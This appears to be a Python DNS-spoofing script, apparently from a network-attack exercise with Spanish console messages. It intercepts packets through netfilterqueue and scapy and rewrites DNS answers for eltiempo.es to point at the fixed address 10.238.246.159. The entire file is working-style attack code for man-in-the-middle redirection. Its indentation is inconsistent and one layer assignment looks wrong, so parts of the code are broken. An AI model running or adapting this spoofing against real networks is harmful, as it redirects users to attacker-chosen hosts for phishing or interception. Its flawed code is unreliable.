#! /usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
from termcolor import colored

def process_packet(packet):
  scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
      qname = scapy_packet[scapy.DNSQR].qname

      if b'eltiempo.es' in qname:
        print(colored(f'\n\t[+] Envenenando paquete DNS...', 'yellow'))

        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum

        answer = scapy.DNSRR(rrname=qname, rdata="10.238.246.159")
        scapy_packet[scapy.DNSRR].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        packet.set_payload(scapy_packet.build())
        print(colored(f'\n\t[+] Paquete DNS enviado', 'red'))

    packet.accept()

def main():
    print(colored(f'\n[i] Listo para envenenar:', 'green'))
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == '__main__':
  main()
